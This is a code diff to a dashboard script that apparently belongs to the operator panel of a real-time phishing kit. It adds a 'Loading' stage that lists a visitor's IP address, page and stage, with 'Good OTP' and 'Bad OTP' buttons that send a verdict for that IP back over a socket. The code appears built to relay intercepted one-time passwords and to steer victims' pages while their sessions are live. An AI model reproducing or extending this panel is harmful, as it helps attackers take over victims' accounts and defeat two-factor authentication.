@@ -154,7 +154,25 @@
             socket.emit('sendOTP', {ip: ipAddress })
             console.log('emit otp send')
           });
-          } else {
+          } else if(details.stage == 'Loading') {
+             row.innerHTML = `
+                <td><span class="badge bg-${color}">${details.status}</span></td>
+                <td>${ipAddress}</td>
+                <td>${details.page || ''}</td>
+                <td>${details.stage || ''}</td>
+                <td><button class="btn btn-primary results-button">Results</button>  <button class="btn btn-success send-good-button">Good OTP</button> <button class="btn btn-danger send-bad-button">Bad OTP</button></td> <!-- Action column -->
+            `;
+             let sendGoodButton = row.querySelector('.send-good-button');
+            let sendBadButton = row.querySelector('.send-bad-button');
+          sendGoodButton.addEventListener('click', function() {
+            socket.emit('sendOTPResponse', {ip: ipAddress, res:'good'})
+            console.log('emit good otp send')
+          });
+             sendBadButton.addEventListener('click', function() {
+            socket.emit('sendOTPResponse', {ip: ipAddress, res:'bad' })
+            console.log('emit bad otp send')
+          });
+          }else { 
             row.innerHTML = `
                 <td><span class="badge bg-${color}">${details.status}</span></td>
                 <td>${ipAddress}</td>
